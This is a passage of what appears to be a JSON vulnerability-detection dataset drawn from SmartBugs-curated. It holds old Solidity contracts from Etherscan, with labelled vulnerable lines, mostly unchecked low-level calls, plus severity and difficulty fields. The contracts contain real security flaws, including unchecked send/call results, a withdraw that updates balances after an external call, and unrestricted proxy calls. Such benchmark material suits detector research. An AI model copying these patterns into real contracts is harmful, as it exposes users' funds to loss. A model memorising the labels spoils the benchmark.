requests[requestId].fee == DELIVERED_FEE_FLAG) {\n            // If the response is not delivered by the SGX account or the \n            // request has already been responded to, discard the response.\n            return;\n        }\n\n        uint fee = requests[requestId].fee;\n        if (requests[requestId].paramsHash != paramsHash) {\n            // If the hash of request parameters in the response is not \n            // correct, discard the response for security concern.\n            return;\n        } else if (fee == CANCELLED_FEE_FLAG) {\n            // If the request is cancelled by the requester, cancellation \n            // fee goes to the SGX account and set the request as having\n            // been responded to.\n            // <yes> <report> UNCHECKED_LL_CALLS\n            SGX_ADDRESS.send(CANCELLATION_FEE);\n            requests[requestId].fee = DELIVERED_FEE_FLAG;\n            unrespondedCnt--;\n            return;\n        }\n\n        requests[requestId].fee = DELIVERED_FEE_FLAG;\n        unrespondedCnt--;\n\n        if (error < 2) {\n            // Either no error occurs, or the requester sent an invalid query.\n            // Send the fee to the SGX account for its delivering.\n            // <yes> <report> UNCHECKED_LL_CALLS\n            SGX_ADDRESS.send(fee);         \n        } else {\n            // Error in TC, refund the requester.\n            externalCallFlag = true;\n            // <yes> <report> UNCHECKED_LL_CALLS\n            requests[requestId].requester.call.gas(2300).value(fee)();\n            externalCallFlag = false;\n        }\n\n        uint callbackGas = (fee - MIN_FEE) / tx.gasprice; // gas left for the callback function\n        DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData); // log the response information\n        if (callbackGas > msg.gas - 5000) {\n            callbackGas = msg.gas - 5000;\n        }\n        \n        externalCallFlag = true;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData); // call the callback function in the application contract\n        externalCallFlag = false;\n    }\n\n    function cancel(uint64 requestId) public returns (int) {\n        if (externalCallFlag) {\n            throw;\n        }\n\n        if (killswitch) {\n            return 0;\n        }\n\n        uint fee = requests[requestId].fee;\n        if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {\n            // If the request was sent by this user and has money left on it,\n            // then cancel it.\n            requests[requestId].fee = CANCELLED_FEE_FLAG;\n            externalCallFlag = true;\n            if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {\n                throw;\n            }\n            externalCallFlag = false;\n            Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);\n            return SUCCESS_FLAG;\n        } else {\n            Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1);\n            return FAIL_FLAG;\n        }\n    }\n}",
    "vulnerable_function": "deliver",
    "vulnerable_lines": [
      162
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 162",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol",
    "pragma": "0.4.9",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x8fd1e427396ddb511533cf9abdbebd0a7e08da35",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>=MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
    "vulnerable_function": "WithdrawToken",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 44",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x958a8f594101d2c0485a52319f29b2647f2ebc06",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 55\n */\n\npragma solidity ^0.4.16;\n\n/// @author Jordi Baylina\n/// Auditors: Griff Green & psdev\n/// @notice Based on http://hudsonjameson.com/ethereummarriage/\n/// License: GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    address public owner;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public newOwner;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function changeOwner(address _newOwner) onlyOwner {\n        newOwner = _newOwner;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function acceptOwnership() {\n        if (msg.sender == newOwner) {\n            owner = newOwner;\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n         // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n\n\ncontract Marriage is Owned\n{\n    // Marriage data variables\n    string public partner1;\n    string public partner2;\n    uint public marriageDate;\n    string public marriageStatus;\n    string public vows;\n\n    Event[] public majorEvents;\n    Message[] public messages;\n\n    struct Event {\n        uint date;\n        string name;\n        string description;\n        string url;\n    }\n\n    struct Message {\n        uint date;\n        string nameFrom;\n        string text;\n        string url;\n        uint value;\n    }\n\n    modifier areMarried {\n        require(sha3(marriageStatus) == sha3(\"Married\"));\n        _;\n    }\n\n    //Set Owner\n    function Marriage(address _owner) {\n        owner = _owner;\n    }\n\n    function numberOfMajorEvents() constant public returns (uint) {\n        return majorEvents.length;\n    }\n\n    function numberOfMessages() constant public returns (uint) {\n        return messages.length;\n    }\n\n    // Create initial marriage contract\n    function createMarriage(\n        string _partner1,\n        string _partner2,\n        string _vows,\n        string url) onlyOwner\n    {\n        require(majorEvents.length == 0);\n        partner1 = _partner1;\n        partner2 = _partner2;\n        marriageDate = now;\n        vows = _vows;\n        marriageStatus = \"Married\";\n        majorEvents.push(Event(now, \"Marriage\", vows, url));\n        MajorEvent(\"Marrigage\", vows, url);\n    }\n\n    // Set the marriage status if it changes\n    function setStatus(string status, string url) onlyOwner\n    {\n        marriageStatus = status;\n        setMajorEvent(\"Changed Status\", status, url);\n    }\n\n    // Set the IPFS hash of the image of the couple\n    function setMajorEvent(string name, string description, string url) onlyOwner areMarried\n    {\n        majorEvents.push(Event(now, name, description, url));\n        MajorEvent(name, description, url);\n    }\n\n    function sendMessage(string nameFrom, string text, string url) payable areMarried {\n        if (msg.value > 0) {\n            owner.transfer(this.balance);\n        }\n        messages.push(Message(now, nameFrom, text, url, msg.value));\n        MessageSent(nameFrom, text, url, msg.value);\n    }\n\n\n    // Declare event structure\n    event MajorEvent(string name, string description, string url);\n    event MessageSent(string name, string description, string url, uint value);\n}",
    "vulnerable_function": "execute",
    "vulnerable_lines": [
      55
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 55",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol",
    "pragma": "0.4.16",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0x9d06cbafa865037a01d322d3f4222fa3e04e5488",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x9d06cbafa865037a01d322d3f4222fa3e04e5488.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54,65\n */\n\npragma solidity ^0.4.23;        \n\n// ----------------------------------------------------------------------------------------------\n// Project Delta \n// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!\n// For 1 DELTA token in future you will get 1 DELTA coin!\n// Site: http://delta.money\n// Telegram Chat: @deltacoin\n// Telegram News: @deltaico\n// CEO Nechesov Andrey http://facebook.com/Nechesov     \n// Telegram: @Nechesov\n// Ltd. \"Delta\"\n// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a                  \n// ----------------------------------------------------------------------------------------------\n   \ncontract Delta {     \n\n\taddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; \n\taddress public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\t\n\taddress public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\t\n\tuint public active = 1;\t\n\n\tuint public token_price = 10**18*1/1000; \t\n\n\t//default function for buy tokens      \n\tfunction() payable {        \n\t    tokens_buy();        \n\t}\n\n\t/**\n\t* Buy tokens\n\t*/\n    function tokens_buy() payable returns (bool) {         \n        \n        require(active > 0);\n        require(msg.value >= token_price);        \n\n        uint tokens_buy = msg.value*10**18/token_price;\n\n        require(tokens_buy > 0);\n\n        if(!c.call(bytes4(sha3(\"transferFrom(address,address,uint256)\")),owner, msg.sender,tokens_buy)){\n        \treturn false;\n        }\n\n        uint sum2 = msg.value * 3 / 10;           \n        // <yes> <report> UNCHECKED_LL_CALLS\n        owner2.send(sum2);\n\n        return true;\n      }     \n\n      //Withdraw money from contract balance to owner\n      function withdraw(uint256 _amount) onlyOwner returns (bool result) {\n          uint256 balance;\n          balance = this.balance;\n          if(_amount > 0) balance = _amount;\n          // <yes> <report> UNCHECKED_LL_CALLS\n          owner.send(balance);\n          return true;\n      }\n\n      //Change token\n      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {\n        token_price = _token_price;\n        return true;\n      }\n\n      //Change active\n      function change_active(uint256 _active) onlyOwner returns (bool result) {\n        active = _active;\n        return true;\n      }\n\n      // Functions with this modifier can only be executed by the owner\n    \tmodifier onlyOwner() {\n        if (msg.sender != owner) {\n            throw;\n        }\n        _;\n    }        \t\n\n\n}",
    "vulnerable_function": "tokens_buy",
    "vulnerable_lines": [
      54
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 54",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0x9d06cbafa865037a01d322d3f4222fa3e04e5488.sol",
    "pragma": "0.4.23",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xa1fceeff3acc57d257b917e30c4df661401d6431",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xa1fceeff3acc57d257b917e30c4df661401d6431.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 31\n */\n\npragma solidity ^0.4.18;\n\ncontract AirDropContract{\n\n    function AirDropContract() public {\n    }\n\n    modifier validAddress( address addr ) {\n        require(addr != address(0x0));\n        require(addr != address(this));\n        _;\n    }\n    \n    function transfer(address contract_address,address[] tos,uint[] vs)\n        public \n        validAddress(contract_address)\n        returns (bool){\n\n        require(tos.length > 0);\n        require(vs.length > 0);\n        require(tos.length == vs.length);\n        bytes4 id = bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i = 0 ; i < tos.length; i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            contract_address.call(id, msg.sender, tos[i], vs[i]);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      31
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 31",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xa46edd6a9a93feec36576ee5048146870ea2c3ae",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    \n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      16
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 16",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol",
    "pragma": "0.4.18",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[0].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[1].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[2].call.value(_share).gas(800000)();\n\t\t// <yes> <report> UNCHECKED_LL_CALLS\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\t\t\t// <yes> <report> UNCHECKED_LL_CALLS\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
    "vulnerable_function": "fundPuppets",
    "vulnerable_lines": [
      69
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 69",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6.sol",
    "pragma": "0.4.23",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract DepositProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "vulnerable_function": "proxy",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 14",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xb37f18af15bafb869a065b61fc83cfc44ed9cc27",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb37f18af15bafb869a065b61fc83cfc44ed9cc27.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value) public onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _target.call.value(_value)();\n    }\n}",
    "vulnerable_function": "sendMoney",
    "vulnerable_lines": [
      33
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 33",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xb37f18af15bafb869a065b61fc83cfc44ed9cc27.sol",
    "pragma": "0.4.24",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xb620cee6b52f96f3c6b253e6eea556aa2d214a99",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 100,106,133\n */\n\n// by nightman\n// winner gets the contract balance\n// 0.02 to play\n\n\npragma solidity ^0.4.23;\n\ncontract DrainMe {\n\n//constants\n\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\n\nmapping(address=>bool) approvedPlayers;\n\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\n\n//constructor\n\nfunction DranMe() public payable{\n\towner = msg.sender;\n}\n\n//modifiers\n\nmodifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n}\n\nmodifier onlyWinner() {\n    require(msg.sender == winner);\n    _;\n}\n\nmodifier onlyPlayers() {\n    require(approvedPlayers[msg.sender]);\n    _;\n}\n\n//functions\n\nfunction getLength() public constant returns(uint256) {\n\treturn seed.length;\n}\n\nfunction setSecret(uint256 _secret) public payable onlyOwner{\n\tsecret = _secret;\n}\n\nfunction getPlayerCount() public constant returns(uint256) {\n\treturn players.length;\n}\n\nfunction getPrize() public constant returns(uint256) {\n\treturn address(this).balance;\n}\n\nfunction becomePlayer() public payable{\n\trequire(msg.value >= 0.02 ether);\n\tplayers.push(msg.sender);\n\tapprovedPlayers[msg.sender]=true;\n}\n\nfunction manipulateSecret() public payable onlyPlayers{\n\trequire (msg.value >= 0.01 ether);\n\tif(msg.sender!=owner || unlockSecret()){\n\t    uint256 amount = 0;\n        msg.sender.transfer(amount);\n\t}\n}\n\nfunction unlockSecret() private returns(bool){\n    bytes32 hash = keccak256(blockhash(block.number-1));\n    uint256 secret = uint256(hash);\n        if(secret%5==0){\n            winner = msg.sender;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n\nfunction callFirstTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\tfirstTarget.call.value(msg.value)();\n}\n\nfunction callSecondTarget () public payable onlyPlayers {\n\trequire (msg.value >= 0.005 ether);\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\tsecondTarget.call.value(msg.value)();\n}\n\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\n\tseed[_index] = _value;\n}\n\t\nfunction addSeed (uint256 _add) public payable onlyPlayers {\n\tseed.length = _add;\n}\n\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\n\treturn (_seed / (seed[0]*seed[1]));\n\tif((_seed / (seed[0]*seed[1])) == secret) {\n\t\towner = winner;\n\t}\n}\n\nfunction checkSecret () public payable onlyPlayers returns(bool) {\n    require(msg.value >= 0.01 ether);\n    if(msg.value == secret){\n        return true;\n    }\n}\n\nfunction winPrize() public payable onlyOwner {\n\t// <yes> <report> UNCHECKED_LL_CALLS\n\towner.call.value(1 wei)();\n}\n\nfunction claimPrize() public payable onlyWinner {\n\twinner.transfer(address(this).balance);\n}\n\n//fallback function\n\nfunction() public payable{\n\t}\n}",
    "vulnerable_function": "callFirstTarget",
    "vulnerable_lines": [
      100
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Unchecked return value - low-level call result not validated at line(s) 100",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.sol",
    "pragma": "0.4.23",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 25\n */\n\npragma solidity ^0.4.23;\n\n/*\n!!! THIS CONTRACT IS EXPLOITABLE AND FOR EDUCATIONAL PURPOSES ONLY !!!\n\nThis smart contract allows a user to (insecurely) store funds\nin this smart contract and withdraw them at any later point in time\n*/\n\ncontract keepMyEther {\n    mapping(address => uint256) public balances;\n    \n    function () payable public {\n        balances[msg.sender] += msg.value;\n    }\n    \n    function withdraw() public {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        msg.sender.call.value(balances[msg.sender])();\n        balances[msg.sender] = 0;\n    }\n}",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      25
    ],
    "vulnerability_type": "unchecked_return",
    "original_category": "unchecked_low_level_calls",
    "severity": "medium",
    "difficulty_tier": 1,
    "description": "Unchecked return value - low-level call result not validated at line(s) 25",
    "fix_description": "Check return value and handle failures appropriately",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/unchecked_low_level_calls/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol",
    "pragma": "0.4.23",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_unchecked_low_level_calls_0xbaa3de6504690efb064420d89e871c27065cdd52",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xbaa3de6504690efb064420d89e871c27065cdd52.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.23;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.25 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
    "vulnerable_function": "proxy",
    "vulnerable_lines": [
      14
